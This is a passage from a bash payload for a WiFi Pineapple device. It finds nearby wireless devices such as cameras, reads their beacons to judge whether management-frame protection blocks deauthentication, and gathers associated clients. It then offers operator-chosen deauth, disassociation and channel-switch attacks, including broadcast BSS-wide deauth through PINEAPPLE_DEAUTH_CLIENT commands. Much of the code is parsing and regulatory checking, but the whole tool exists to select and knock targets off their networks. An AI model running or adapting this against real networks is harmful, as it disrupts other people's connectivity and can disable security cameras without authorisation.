  # `--inject wlan1mon` (CLAUDE.md "First contact"); falsified by
  # `cat /proc/$(pgrep -n pineapd)/cmdline | tr "\0" " "` showing --inject on another interface,
  # in which case RECON_IF is the wrong phy to read.
  # Merging every phy under $INJ_SYSFS -- the old behaviour, kept only as
  # the fallback for when that file cannot be read -- is a plain last-row-wins overwrite per
  # band/channel key in glob order, over-permissive wherever two phys share a band and disagree:
  # the receive-only radio0 registers 2.4 GHz as the transmitter does (FCC antenna map and UCI
  # band '2g', dev/pager-6ghz-determination-plan.md Addendum 2c), so every 2/<ch> key is written
  # twice and the merged verdict is whichever phy sorts last, not the injecting one.  Hence the
  # fallback is logged, never silent.  A resolved phy whose table reads empty fails the probe
  # (conservative set) rather than merging radios that cannot be the transmitter.
  if phy=$(cat "$namef" 2>/dev/null) && [[ $phy =~ ^[^[:space:]/]+$ ]]; then
    INJ_TXPHY="$phy"; rows=$(iw phy "$phy" channels 2>/dev/null)$'\n'
    log inj "probe: tx phy $phy ($namef)"
  else
    for d in "$INJ_SYSFS"/*; do
      [ -e "$d" ] || continue
      phy=${d##*/}; n=$((n + 1))
      rows+=$(iw phy "$phy" channels 2>/dev/null)$'\n'
    done
    log warn "probe: tx phy unresolved ($namef unreadable); merged $n phys under $INJ_SYSFS"
    ui_ok && LOG yellow "regulatory probe: tx phy unresolved, merged $n phys (over-permissive where they disagree)"
  fi
  [ -n "${rows//[[:space:]]/}" ] || return 1
  local band
  while IFS='|' read -r freq ch dis; do
    [[ $freq =~ ^[0-9]+$ && $ch =~ ^[0-9]+$ ]] || continue
    if (( freq >= 5925 )); then band=6; elif (( freq >= 4900 )); then band=5; elif (( freq >= 2400 )); then band=2; else continue; fi
    if (( dis == 0 )); then INJ_OK[$band/$ch]=1; else INJ_OK[$band/$ch]=0; fi
  done < <(printf '%s' "$rows" | inj_parse_channels)
  (( ${#INJ_OK[@]} )) || return 1
  INJ_PROBED=1; return 0
}

# Parsed against the shipped iw's own format strings, not an invented layout: the channel
# line is "\t* %d MHz [%d] " optionally followed by "(disabled)", then indented attribute
# lines, of which only the NO_IR one blocks transmission ("Radar detection" does not -- gate 2
# prohibits DISABLED and NO_IR, never RADAR).  iw spells that attribute three ways: "No IR" when
# the kernel sets both NO_IR and the separate legacy NO_IBSS slot, otherwise "Passive scan" or
# "No IBSS" -- all three must block, or an older kernel's NO_IR channel reads as injectable.
# The "phy%d %d MHz [%d]:" layout that other iw subcommands print also matches the channel rule, but
# the frequency is taken as the FIRST digit run on the line, so such a row carries the phy index as
# its frequency ("phy1 5180 MHz [36]:" -> 1|36|0 under mawk and BusyBox awk; pinned by the selftest)
# and inj_probe drops it at its band check (< 2400).  Only `iw phy <phy> channels` output is supported.
inj_parse_channels() {   # stdin: iw phy <phy> channels -> "freq|channel|blocked" rows
  awk '
      function flush() { if (ch != "") printf "%d|%d|%d\n", freq, ch, bad }
      /MHz[ \t]*\[[0-9]+\]/ {
          flush()
          freq = $0; sub(/^[^0-9]*/, "", freq); sub(/[^0-9].*$/, "", freq)
          ch = $0; sub(/^.*\[/, "", ch); sub(/\].*$/, "", ch)
          bad = ($0 ~ /\(disabled\)/) ? 1 : 0
          next
      }
      /^[ \t]+(No IR|Passive scan|No IBSS)[ \t]*$/ { if (ch != "") bad = 1; next }
      /^[Bb]and [0-9]+:/    { flush(); ch = ""; next }
      END { flush() }'
}

csa_injectable() {   # csa_injectable <band> <channel> -> 0 when a frame can actually leave
  local b="$1" c="$2"
  [[ $c =~ ^[0-9]+$ ]] || return 1
  # gate 1: pineapd's compiled-in refusals, independent of regulatory state
  [ "$b" = 5 ] && [[ $PINEAPD_DFS_BLOCKED == *" $c "* ]] && return 1
  # 6 GHz stays refused: pineapd rejects a channel whose band field is 6 GHz outright,
  # and whether our command path produces that encoding is unverified.  Until the
  # determination plan settles it on real hardware, refusing is the safe verdict.
  [ "$b" = 6 ] && return 1
  # gate 2: the live regulatory state, when we managed to read it
  if (( INJ_PROBED == 1 )); then
    [ "${INJ_OK[$b/$c]}" = 1 ] && return 0
    return 1                 # 0 = refused, unset = this phy never registered the channel
  fi
  # Fallback when the probe is unavailable: only what is injectable under BOTH the US
  # and the world ("00") domain, since we cannot tell which one is live.  Under 00,
  # 5 GHz 149-165 and 2.4 GHz 12-14 carry NO_IR and 2.4 GHz 12-14 are DISABLED under US.
  # 5 GHz 36-48 is in the set only because the SHIPPED regulatory.db drops NO-IR from 00's
  # 5170-5250 rule -- the vendor's one edit to upstream wireless-regdb 2025.02.20
  # (dev/pager-6ghz-determination-plan.md §C2, a reading of the shipped db).  Upstream 00 marks
  # 36-48 NO-IR, so a db rebuilt from upstream makes this branch over-permissive on 36-48 and
  # it must then shrink to 2.4 GHz 1-11.  Falsifier: `iw phy <txphy> channels` printing No IR
  # on 5180 MHz while `iw reg get` says 00.
  case "$b" in
    2) (( c >= 1 && c <= 11 )) && return 0; return 1 ;;
    5) (( c >= 36 && c <= 48 )) && return 0; return 1 ;;
    *) return 1 ;;
  esac
}

posture_from_caps() {   # posture_from_caps <rsncaps_hex|-> <extcap_hex|-> <band> <channel> -> badge
  local rsn="$1" ext="$2" band="$3" ch="$4" lo o mfpc=0 mfpr=0 bp=0
  csa_injectable "$band" "$ch" || { printf 'NOINJ'; return 0; }
  if [ -z "$rsn" ] || [ "$rsn" = - ]; then printf '?'; return 0; fi
  lo=$(hex_octet "$rsn" 0) || { printf '?'; return 0; }
  (( lo & 0x80 )) && mfpc=1
  (( lo & 0x40 )) && mfpr=1
  if [ -n "$ext" ] && [ "$ext" != - ]; then
    if o=$(hex_octet "$ext" 10); then (( o & 0x10 )) && bp=1; fi
  fi
  if   (( mfpr && bp )); then printf 'NONE'
  elif (( mfpr ));       then printf 'C'
  elif (( mfpc ));       then printf 'D?+C'
  else                        printf 'D+C'
  fi
}

# The three operator-selectable attacks. The badge advises; it never decides.
#   DEAUTH  PINEAPPLE_DEAUTH_CLIENT     [bssid] [target] [channel]  deauth + disassoc, one client
#   CSA     PINEAPPLE_DEAUTH_CLIENT_CSA [bssid] [channel]           channel switch, WHOLE BSS
#   BOTH    PINEAPPLE_DEAUTH_CLIENT_ALL [bssid] [target] [channel]  all three types, WHOLE BSS
#
# ONLY DEAUTH IS TARGETED, and only on a client row. attack_scope() below is the one place that
# decides; the picker's ' bss' marker and the pre-transmit confirm both read it, so the breadth is
# stated where the operator chooses and again before anything is sent.
#   CSA has no [target] argument at all, so its breadth is certain from the signature.  [V]
#   BOTH has one in hak5cmd's help text, and the help text is wrong: pineAPdDeauthAll parses ONE
#        MAC where pineAPdDeauth parses two, and its request struct carries no target field. The
#        discriminating measurements are in CLAUDE.md "2.0.0-stable, analysed"; the frame split
#        that carries them is StartDeauth 32 against StartDeauthAll/StartDeauthCsa 28.  Readings
#        [V] from the 1.1.3 and 2.0.0 daemons; "parses the bssid, discards the target" is [A] --
#        falsify by firing BOTH at one client among several and seeing whether the others stay
#        associated. resp_fire still passes three positionals; json.Unmarshal drops the extra.
#   NB the three pineAPd* HTTP handlers share one 16-byte http.HandlerFunc frame, so the frame
#      does NOT discriminate among them -- an earlier revision of this comment said it did, and
#      attributed the 32-vs-28 split to the wrong trio.
# posture_opts still orders by efficacy (best first), and pick_list preselects element 0, so a
# BSS-wide attack is the default on the common badges. That is deliberate: the marker and the
# confirm carry the breadth, rather than demoting the attack most likely to work.
response_cmd() {
  case "$1" in
    DEAUTH) printf 'PINEAPPLE_DEAUTH_CLIENT' ;;
    CSA)    printf 'PINEAPPLE_DEAUTH_CLIENT_CSA' ;;
    BOTH)   printf 'PINEAPPLE_DEAUTH_CLIENT_ALL' ;;
    *)      printf '' ;;
  esac
}

# attack_scope <attack key> -> cli | bss.  Reads R_TARGET, so call it after resp_target.
# Read from the signatures (response_cmd above): CSA takes <bssid> <ch> and has no target argument
# at all, so it is BSS-wide by construction; _ALL advertises [target] but parses one MAC, so its
# target is accepted and discarded; only DEAUTH parses two and can aim.
# [A] An AP row resolves R_TARGET to ff:ff:ff:ff:ff:ff and this reports that as BSS-wide. Nothing
# in the repo records pineapd honouring a broadcast [target] rather than rejecting it. Note the
# failure is NOT self-announcing: an earlier version of this comment claimed a rejected attack
# would leave "every subject reading NO_EFFECT, the safe direction", which is wrong -- resp_verdict
# returns MOVED for a subject that goes absent, and for a stalled counter whose last-seen did not
# advance, so an idle camera reads MOVED whether or not anything was transmitted. Only NO_EFFECT is
# strong evidence here; MOVED on a quiet device is weak, and a rejected broadcast target would be
# indistinguishable from a successful one.
# Falsified by: PINEAPPLE_DEAUTH_CLIENT <bssid> ff:ff:ff:ff:ff:ff <ch> disconnecting one client, or
# none, with several associated.
attack_scope() {
  case "$1" in
    DEAUTH) [ "$R_TARGET" = 'ff:ff:ff:ff:ff:ff' ] && printf 'bss' || printf 'cli' ;;
    *)      printf 'bss' ;;
  esac
}

# posture_opts <badge> -> viable attack keys, best first; empty when nothing can reach the air
posture_opts() {
  case "$1" in
    'NOINJ'|'NONE') printf '' ;;                 # regulatory wall, or beacon protection: nothing works
    # DEAUTH leads on every remaining badge, and the badge no longer changes the order, because on
    # 1.1.3 it is the ONLY key that reaches the air at all -- see posture_expect for the parse path
    # that kills the other two. The ordering used to lead CSA under PMF, which preselected a key
    # that provably transmits nothing. BOTH and CSA stay offered: the operator asked for them, and
    # a firmware that fixes _ALL would make them live again without a code change here.
    *)              printf 'DEAUTH BOTH CSA' ;;
  esac
}

# posture_expect <badge> <attack key> -> works | partial | blocked | unknown
# Labels each option honestly in the picker so a deliberate no-hope attempt is still the operator's call.
posture_expect() {
  local b="$1" k="$2"
  [ "$b" = NOINJ ] && { printf 'blocked'; return 0; }
  [ "$b" = NONE ]  && { printf 'blocked'; return 0; }
  # CSA and BOTH transmit NOTHING on this firmware, whatever the beacon says, so the badge cannot
  # speak for them. This label records a MEASUREMENT, not a mechanism: on 2026-11-09, on
  # fc:58:5a:08:42:15 ch 8, PINEAPPLE_DEAUTH_CLIENT with ff:ff:ff:ff:ff:ff dropped a client on
  # demand while PINEAPPLE_DEAUTH_CLIENT_ALL with that SAME address, minutes later, did nothing --
  # one address, one channel, one BSSID, two opcodes, two outcomes. The mechanism is NOT settled:
  # pineapd runs one handler that dispatches on a numeric opcode (400 deauth, 401 deauth+CSA, 402
  # CSA) and _ALL's deauth half reaches the same instruction with the same arguments as the call
  # that works, because StartDeauthAll writes sta = ff:ff:ff:ff:ff:ff by immediate. The leading
  # hypothesis is that inject_csa's set_and_freeze_primary_channel_hop_s retunes the radio between
  # inject_deauth's enqueue and the injection handler's transmit. CLAUDE.md "Third contact" has the
  # addresses and the one-command test. CSA additionally carries Channel Switch Count 0 AND a
  # hardcoded New Channel Number of 14 (Japan-only), either of which alone would stop a US client
  # acting on it. hak5cmd exits 0 and prints nothing on every path, so none of this is visible
  # above the socket -- which is exactly why the operator needs the label.
  # Falsified by: _ALL or _CSA disconnecting any client, on any firmware, from any caller.
  case "$k" in CSA|BOTH) printf 'fw-broken'; return 0 ;; esac
  [ "$b" = '?' ]   && { printf 'unknown'; return 0; }
  case "$k" in
    DEAUTH)      case "$b" in 'D+C') printf 'works' ;; 'D?+C') printf 'partial' ;; *) printf 'blocked' ;; esac ;;
    *)           printf 'unknown' ;;
  esac
}

# ---- beacon posture read -------------------------------------------------------------------
# Walks a captured beacon's tagged parameters for element 48 (RSN) and 127 (Extended Capabilities).
# No managed interface on this device can scan 5/6 GHz (radio0 is 2g, radio1 is monitor-only), so
# the beacon on RECON_IF is the only posture source that covers every band CamHound reports on.
POSTURE_RSN=-; POSTURE_EXT=-; BCN_HEX=""; BCN_IES=0

hex_u16le() {   # hex_u16le <hexstring> <index0> -> decimal, nonzero rc if short
  local a b
  a=$(hex_octet "$1" "$2") || return 1
  b=$(hex_octet "$1" "$(( $2 + 1 ))") || return 1
  printf '%d' "$(( a + b * 256 ))"
}

ie_find() {   # ie_find <hexstring> <first element octet> <element id> -> payload hex, rc 1 if absent
  local h="$1" p="$2" want="$3" id len n
  n=$(( ${#h} / 2 ))
  while (( p + 2 <= n )); do
    id=$(hex_octet "$h" "$p") || return 1
    len=$(hex_octet "$h" "$(( p + 1 ))") || return 1
    (( p + 2 + len > n )) && return 1          # truncated element chain: stop, do not guess
    if (( id == want )); then printf '%s' "${h:$(( (p + 2) * 2 )):$(( len * 2 ))}"; return 0; fi
    p=$(( p + 2 + len ))
  done
  return 1
}

rsn_caps() {   # rsn_caps <element 48 payload hex> -> 2-octet RSN Capabilities hex, low octet first
  local h="$1" p=6 n cnt                       # skip version (2) + group cipher suite (4)
  n=$(( ${#h} / 2 ))
  (( n >= 8 )) || return 1
  cnt=$(hex_u16le "$h" "$p") || return 1; p=$(( p + 2 + 4 * cnt ))   # pairwise suite list
  (( p + 2 <= n )) || return 1
  cnt=$(hex_u16le "$h" "$p") || return 1; p=$(( p + 2 + 4 * cnt ))   # AKM suite list
  (( p + 2 <= n )) || return 1
  printf '%s' "${h:$(( p * 2 )):4}"
}

# Watch needs tcpdump plus a hex dumper. Both pcap readers below fall back to od, so either
# dumper satisfies it; requiring hexdump specifically disabled Watch on hosts that have only od
# (most non-busybox Linux) for no reason. A Pager always has busybox hexdump, so this only ever
# mattered off-device -- but it made laptop and harness runs fail in a way that looked like a bug.
capture_ready() {   # capture_ready -> 0 when a Watch capture can be taken and parsed
  command -v tcpdump >/dev/null 2>&1 || return 1
  command -v hexdump >/dev/null 2>&1 || command -v od >/dev/null 2>&1
}

pcap_bytes() {   # whole file as one lowercase hex string (od fallback mirrors pcap_words)
  if command -v hexdump >/dev/null 2>&1; then hexdump -v -e '1/1 "%02x"' "$1" 2>/dev/null
  else od -An -v -tx1 "$1" 2>/dev/null | tr -d ' \n'; fi
}

beacon_find() {   # beacon_find <pcap> -> sets BCN_HEX and BCN_IES at the first beacon's elements
  local f="$1" h p n rec rt fc
  h=$(pcap_bytes "$f") || return 1
  [ -n "$h" ] || return 1
  case "${h:0:8}" in d4c3b2a1|a1b2c3d4|4d3cb2a1|a1b23c4d) ;; *) return 1 ;; esac
  n=$(( ${#h} / 2 )); p=24                     # pcap global header
  while (( p + 16 <= n )); do
    rec=$(hex_u16le "$h" "$(( p + 8 ))") || return 1   # incl_len; low 16 bits suffice for a beacon
    p=$(( p + 16 ))
    (( rec > 0 && p + rec <= n )) || return 1
    rt=$(hex_u16le "$h" "$(( p + 2 ))") || return 1    # radiotap it_len
    if (( rt >= 8 && rt + 36 <= rec )); then
      fc=$(hex_octet "$h" "$(( p + rt ))")
      # 0x80 = protocol version 0, type management, subtype beacon
      if [ "$fc" = 128 ]; then BCN_HEX="$h"; BCN_IES=$(( p + rt + 36 )); return 0; fi
    fi
    p=$(( p + rec ))
  done
  return 1
}

POSTURE_BADGE='?'
posture_read_pcap() {   # posture_read_pcap <pcap> <band> <channel> -> badge (stdout and POSTURE_BADGE)
  local f="$1" band="$2" ch="$3" rsn ext caps
  POSTURE_RSN=-; POSTURE_EXT=-
  if beacon_find "$f"; then
    if rsn=$(ie_find "$BCN_HEX" "$BCN_IES" 48); then
      caps=$(rsn_caps "$rsn") && POSTURE_RSN="$caps"
    else
      POSTURE_RSN=0000                         # no RSN element at all: open network, no PMF
    fi
    ext=$(ie_find "$BCN_HEX" "$BCN_IES" 127) && POSTURE_EXT="$ext"
  fi
  POSTURE_BADGE=$(posture_from_caps "$POSTURE_RSN" "$POSTURE_EXT" "$band" "$ch")
  printf '%s' "$POSTURE_BADGE"
}

capture_beacon() {   # capture_beacon <bssid> -> pcap path on stdout, rc 1 on failure
  local bssid="$1" out="/tmp/cs_bcn_$$.pcap" p w=0
  [ "$HAVE_TCPDUMP" = 1 ] || return 1
  rm -f "$out"
  tcpdump -i "$RECON_IF" -nn -s 0 -c "$BCN_CAP_COUNT" -w "$out" \
    "type mgt subtype beacon and wlan addr2 $bssid" >/dev/null 2>&1 & p=$!
  child_add "$p"
  while (( w < BCN_CAP_SECS )); do kill -0 "$p" 2>/dev/null || break; sleep 1; w=$(( w + 1 )); done
  kill -TERM "$p" 2>/dev/null; wait "$p" 2>/dev/null; child_del "$p"
  [ -s "$out" ] || { rm -f "$out"; return 1; }
  printf '%s' "$out"
}

# pcap_stream file -> one unsigned byte per line. The byte-oriented twin of pcap_words, and the
# reason this walker is not written with pcap_bytes + ${h:off:2} like beacon_find: bash substring
# extraction costs O(whole string), so that shape is O(records x filesize) and overruns the EXAMINE
# lock on anything bigger than a beacon. Measured, with the method and numbers, in RESPONSE.md 13a-i.
pcap_stream() { if command -v hexdump >/dev/null 2>&1; then hexdump -v -e '1/1 "%u\n"' "$1" 2>/dev/null; else od -An -v -tu1 -w1 "$1" 2>/dev/null | tr -d ' '; fi; }

# CLI_AWK: walk a pcap of data frames and report which stations talked to one BSSID.
# Reads the frame itself rather than trusting the capture filter, because a filter cannot tell us
# WHICH address is the client: addr2 is always the transmitter, so on a ToDS (uplink) frame addr2 is
# the client, but on a FromDS (downlink) frame addr2 is the AP. Harvesting addr2 unconditionally
# would enter the AP as its own client and break resp_snapshot's invariant that the AP is never a
# subject -- and one AP subject reading NO_EFFECT drags the whole attempt to NO_EFFECT.
# Emits keyed lines for the caller to read IN THE PARENT SHELL: ITMAX/RECS/SHORT/CLI.
CLI_AWK='
function mac(o) { return sprintf("%02x:%02x:%02x:%02x:%02x:%02x", p[o], p[o+1], p[o+2], p[o+3], p[o+4], p[o+5]) }
function u16(a, b) { return be ? a * 256 + b : b * 256 + a }
function le16(a, b) { return b * 256 + a }   # radiotap is little-endian by spec, whatever the pcap is
function u32(a, b, c, d) { return be ? ((a * 256 + b) * 256 + c) * 256 + d : ((d * 256 + c) * 256 + b) * 256 + a }
BEGIN { st = 0; i = 0; itmax = 0; recs = 0; short = 0 }
{ v = $1 + 0
  if (st == 0) { g[i++] = v
    if (i == 24) { m = sprintf("%02x%02x%02x%02x", g[0], g[1], g[2], g[3])
      if (m == "d4c3b2a1" || m == "4d3cb2a1") be = 0
      else if (m == "a1b2c3d4" || m == "a1b23c4d") be = 1
      else { print "ERR magic " m; bad = 1; exit 1 }
      snap = u32(g[16], g[17], g[18], g[19])   # snaplen from the header, to tell truncation apart
      st = 1; i = 0 }
    next }
  if (st == 1) { h[i++] = v
    if (i == 16) { incl = u32(h[8], h[9], h[10], h[11]); i = 0
      if (incl <= 0) { print "ERR incl " incl; bad = 1; exit 1 }
      want = incl; np = 0; split("", p); st = 2 }
    next }
  if (np < 256) p[np] = v
  np++
  if (np < want) next
  recs++
  do {
    if (want < 4) break
    rt = le16(p[2], p[3])         # NOT u16: the radiotap header is little-endian regardless
    if (rt > itmax) itmax = rt
    if (rt < 8) break
    if (rt + 16 > want) {
      # Two different causes, and blaming the snap for both sends the operator to the wrong knob:
      # a record at the snaplen was CUT (raise CLI_CAP_SNAP), a shorter one is simply a small
      # frame -- an ACK-sized or Null frame that never held addr2 to begin with.
      if (snap > 0 && want >= snap) trunc++; else runt++
      short++; break }
    if (int(p[rt] / 4) % 4 != 2) break
    ds = p[rt + 1] % 4
    if (ds == 1) { bo = rt + 4; co = rt + 10 }
    else if (ds == 2) { bo = rt + 10; co = rt + 4 }
    else break
    if (mac(bo) != bss) break
    c = mac(co)
    if (c == bss) break
    if (p[co] % 2 == 1) break
    if (index(own, " " c " ") > 0) break
    seen[c]++
  } while (0)
  st = 1; i = 0
}
END { if (bad) exit 1
  if (st == 0) { print "ERR truncated header"; exit 1 }   # never reached the magic: not a pcap at all
  print "ITMAX " itmax; print "RECS " recs; print "SHORT " short
  print "TRUNC " trunc + 0; print "RUNT " runt + 0; print "SNAP " snap + 0
  for (c in seen) if (seen[c] >= 2) print "CLI " c }'

# bss_clients <pcap> <bssid> -> keyed lines on stdout; rc 1 when the file is unreadable or not a pcap.
# PARSE IT IN THE PARENT SHELL: the counts have to reach the caller, and a pipe or < <(...) would
# set them in a subshell -- the same trap posture_of documents for its caps globals.
# A station must be seen at least TWICE to be admitted: a monitor interface delivers FCS-corrupt
# frames whose addresses are garbage, and one such frame would otherwise invent a subject. The cost
# is that a station sending exactly one frame in the window is missed.
bss_clients() {
  local f="$1" bss="${2,,}"
  [ -s "$f" ] || return 1
  pcap_stream "$f" | awk -v bss="$bss" -v own="$OWN_MACS" "$CLI_AWK"
}

# capture_bss <bssid> -> pcap path on stdout, rc 1 on failure.
# The OR filter wants both directions; PLAN_v2 item 13b records "OR filter fails -> two instances"
# as an open risk on this libpcap, so one fallback to the uplink-only shape is built in rather than
# booked as a bench step. tcpdump writes the 24-byte global header as soon as it arms, so an absent
# or empty file after a second means it refused the filter; exactly 24 bytes means it armed and
# heard nothing. Those are different answers and the caller reports them differently.
capture_bss() {
  local bss="$1" out="/tmp/cs_mem_$$.pcap" p w=0 filt
  [ "$HAVE_TCPDUMP" = 1 ] || return 1
  rm -f "$out"
  filt="type data and (wlan addr1 $bss or wlan addr2 $bss)"
  tcpdump -i "$RECON_IF" -nn -s "$CLI_CAP_SNAP" -c "$CLI_CAP_COUNT" -w "$out" "$filt" >/dev/null 2>&1 & p=$!
  child_add "$p"; sleep 1; w=1
  if [ ! -s "$out" ] && ! kill -0 "$p" 2>/dev/null; then
    child_del "$p"
    log resp "member capture: OR filter did not arm, retrying uplink-only"
    filt="type data and wlan addr1 $bss"
    tcpdump -i "$RECON_IF" -nn -s "$CLI_CAP_SNAP" -c "$CLI_CAP_COUNT" -w "$out" "$filt" >/dev/null 2>&1 & p=$!
    child_add "$p"; sleep 1; w=1
  fi
  while (( w < CLI_CAP_SECS )); do kill -0 "$p" 2>/dev/null || break; sleep 1; w=$(( w + 1 )); done
  kill -TERM "$p" 2>/dev/null; wait "$p" 2>/dev/null; child_del "$p"
  [ -s "$out" ] || { rm -f "$out"; return 1; }
  printf '%s' "$out"
}

POSTURE_LAST='?'
posture_of() {   # posture_of <bssid> <band> <channel> -> badge (stdout and POSTURE_LAST), cached per BSSID
  # Call it directly, not in $(...): the cache, POSTURE_RSN and POSTURE_EXT are set in the caller's shell.
  local bssid="$1" band="$2" ch="$3" f b now="$EPOCHSECONDS" locked_here=0
  # Both early returns below answer without reading a beacon, so the caps globals must not keep the
  # PREVIOUS target's values -- resp_write records them as this response's rsn_caps/beacon_prot and
  # would otherwise attribute another BSSID's posture to this row. The caps are cached per BSSID beside
  # the badge, so a hit restores THIS target's caps instead of blanking its loot row.
  POSTURE_RSN=-; POSTURE_EXT=-
  if [ -n "${POSTURE[$bssid]}" ] && (( now - ${POSTURE_TS[$bssid]:-0} < POSTURE_TTL )); then
    POSTURE_RSN="${POSTURE_RSN_C[$bssid]:--}"; POSTURE_EXT="${POSTURE_EXT_C[$bssid]:--}"
    POSTURE_LAST="${POSTURE[$bssid]}"; printf '%s' "$POSTURE_LAST"; return 0
  fi
  # A channel we may not transmit on needs no capture: the answer is NOINJ whatever the beacon says.
  if [ "$(posture_from_caps - - "$band" "$ch")" = NOINJ ]; then
    POSTURE[$bssid]=NOINJ; POSTURE_TS[$bssid]=$now; POSTURE_RSN_C[$bssid]=-; POSTURE_EXT_C[$bssid]=-; POSTURE_LAST=NOINJ; printf 'NOINJ'; return 0
  fi
  # Recon hops while unlocked, so a 4 s capture on one BSSID mostly misses; hold the channel for it.
  if [ "$WATCH_LOCKED" != 1 ]; then lock_target "$bssid" $(( BCN_CAP_SECS + 5 )) "$ch" >/dev/null; locked_here=1; fi
  if f=$(capture_beacon "$bssid"); then posture_read_pcap "$f" "$band" "$ch" >/dev/null; b="$POSTURE_BADGE"; rm -f "$f"; else POSTURE_RSN=-; POSTURE_EXT=-; b='?'; fi
  (( locked_here )) && unlock_target
  if [ "$b" != '?' ]; then POSTURE[$bssid]="$b"; POSTURE_TS[$bssid]=$now; POSTURE_RSN_C[$bssid]="$POSTURE_RSN"; POSTURE_EXT_C[$bssid]="$POSTURE_EXT"; fi   # a failed read is not cached
  POSTURE_LAST="$b"; printf '%s' "$b"
}
# --- response posture end ---

cleanup() {
  [ "$(cat "$LOCK_FILE" 2>/dev/null)" = "$$" ] || return 0
  trap - EXIT INT TERM
  kill_children
  if [ "$WATCH_LOCKED" = 1 ]; then _pineap EXAMINE CANCEL >/dev/null 2>&1; PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1; fi
  [ -n "$RUN_ID" ] && [ "$REPORT_DONE_AT_EXIT" != 1 ] && write_report quiet
  command -v bands_restore >/dev/null 2>&1 && bands_restore         # user payload only; the hooks never change bands
  rm -f "$LOCK_FILE" "$CHILD_FILE" /tmp/cs_up_?.pcap /tmp/cs_dn_?.pcap /tmp/cs_ot_?.pcap "/tmp/cs_mem_$$.pcap" "/tmp/cs_bcn_$$.pcap" "$FIRE_ERR" /tmp/cs_*.err /tmp/cs_signal "$LOOT_DIR/inventory.tsv.new" /tmp/cs_rows.tmp
  log run "exit cycles=$CYCLE"
  ui_ok && set_state FINISH
}
kill_children() {   # by stored PID only, never by pattern
  local p
  [ -f "$CHILD_FILE" ] || return 0
  while read -r p; do [ -n "$p" ] && kill -TERM "$p" 2>/dev/null; done <"$CHILD_FILE"
  sleep 0.3
  while read -r p; do [ -n "$p" ] && kill -KILL "$p" 2>/dev/null; done <"$CHILD_FILE"
  : >"$CHILD_FILE"
}
child_add() { printf '%s\n' "$1" >>"$CHILD_FILE"; }
child_del() { [ -f "$CHILD_FILE" ] && grep -v -x "$1" "$CHILD_FILE" >"$CHILD_FILE.n" 2>/dev/null && mv "$CHILD_FILE.n" "$CHILD_FILE"; }

# ============================================================================ scan state ===
declare -A ROLE SSID_CLEAN AP_OF CH FREQ BAND HIDDEN PROBES PREV_PKT PREV_T RATE BUSY_N BUSY
declare -A RSSI_LAST RSSI_HIST RSSI_BEST RSSI_BEST_TS LAST_SEEN FIRST_SEEN N_SEEN
declare -A ID_PTS ID_CLASSES ID_LABEL VEND_TYPE VEND_LABEL VEND_CAT
declare -A SSIDSIG                                   # ssid -> "pts|label|cat|type"
declare -A BEH BEH_GATE BEH_VERDICT CONF BANDNAME TAGS CAT LANE PROX KITAP KITCL
declare -A ALERTED_BAND ALERT_TS OFFERED IGNORED CLIENTS_OF EVENT_FLAG LAT LON RUNS_N
declare -a SEEN_THIS_CYCLE NEW_LIKELY NEW_CONFIRMED NEW_LANE
NEAR_DBM=-60; FAR_DBM=-75; ALERT_FAR=1
BATT="?"; BATT_TS=0; GPS_LAST="no fix"; GPS_BAD=0; LAST_LOCK_TS=0; RECON_EMPTY=0

apply_mode() {
  if [ "$MODE" = "SITE" ]; then NEAR_DBM=-70; FAR_DBM=-85; ALERT_FAR=0
  else MODE="ROOM"; NEAR_DBM=-60; FAR_DBM=-75; ALERT_FAR=1; fi
  log mode "mode -> $MODE"
}

# jq programs: one line per object, | separated, text fields sanitised in jq
JQ_APS='.[] | ([.beacon[]?, .response[]?]) as $e
 | (($e | map(.signal // -100) | max) // "-") as $sig
 | (($e | sort_by(.signal // -100) | last) // {}) as $best
 | (($e | map(select(((.ssid // "") | length) > 0)) | .[0].ssid) // "") as $ssid
 | ([.beacon[]? | .hidden] | any(. == 1 or . == true)) as $hid
 | (($e | map(.time // 0) | max) // 0) as $t
 | [.mac, (.packets // 0), ($ssid | tostring | reduce ("|",";","\n","\r","\t") as $c (.; split($c) | join("_")) | .[0:32]), ($best.channel // 0), ($best.freq // 0), $sig, (if $hid then 1 else 0 end), $t]
 | map(tostring) | join("|")'
# Client objects (2.0.0 `_pineap HELP PARSE`, read in CLAUDE.md s"2.0.0-stable, analysed"; the verb does not exist
# on 1.1.3): mac, time, signal, freq, packets, and a "probe" OBJECT keyed by an opaque SSID hash whose values carry
# the ssid -- so the probed SSIDs are the object's values, not an array. No documented key carries the association;
# ap_mac/bssid are read when present (the harness fixture's stand-in) and "-" otherwise, until the day-one spike
# finds a source (the Go UI's own recon API carries ap_mac; _pineap does not).
JQ_CLI_ROW='([ (.probe // {})[]? | if type == "object" then ((.ssid // "") | select(length > 0)) else tostring end ]) as $p
 | [.mac, (.ap_mac // .bssid // "-"), (.packets // 0), (.signal // .rssi // "-"),
    ($p | map(tostring | reduce ("|",";",",","\n","\r","\t") as $c (.; split($c) | join("_"))) | join(",")),
    (.freq // 0), (.time // .last_seen // 0), (.channel // 0)]
 | map(tostring) | join("|")'
JQ_CLI='.[] | '"$JQ_CLI_ROW"
# jq_works: jq must not merely EXIST, it must run the programs we actually use.
# Measured on the operator's 1.1.3 Pager, 2026-11-04: jq was present, so HAVE_JQ was 1, and both
# JQ_APS and JQ_CLI_ROW produced NOTHING -- a jq without Oniguruma has no gsub, so the programs
# failed at compile time, wrote their error to stderr, and emitted no rows. The regex fallbacks that
# would have worked were never reached, because they are gated on HAVE_JQ. CamHound reported an empty
# airspace and offered "Recon list empty. Start a Recon session?" -- the right message for the wrong
# reason, and no gate here could see it: this container's jq is 1.7 with regex support.
# The gsub uses are gone now, but the probe stays: it tests whatever the programs currently need,
# so the next unavailable builtin degrades to the fallback instead of to silence.
jq_works() {
  command -v jq >/dev/null 2>&1 || return 1
  [ "$(printf '%s' '[{"mac":"aa","probe":{"1":{"ssid":"c,d"}}}]' | jq -r "$JQ_CLI" 2>/dev/null)" \
    = 'aa|-|0|-|c_d|0|0|0' ] || return 1
  return 0
}
# 1.1.3 has no RECON CLIENTS verb (measured 2026-11-03: "Unknown recon command", rc 255) but RECON DEVICES lists every
# device in the same object shape, so a client there is a device that neither beacons nor answers probes.
JQ_DEVCLI='.[] | select(((.beacon // {}) | length) == 0 and ((.response // {}) | length) == 0) | '"$JQ_CLI_ROW"

# fallback parser (no jq): split the JSON on "},{" and read fields with bash regex. Reduced fidelity.
parse_aps_fallback() {   # stdin: JSON -> stdout: mac|packets|ssid|ch|freq|signal|hidden|time
  local json frag mac="" pk=0 ssid="" ch=0 fr=0 sig="-" hid=0 t=0 s
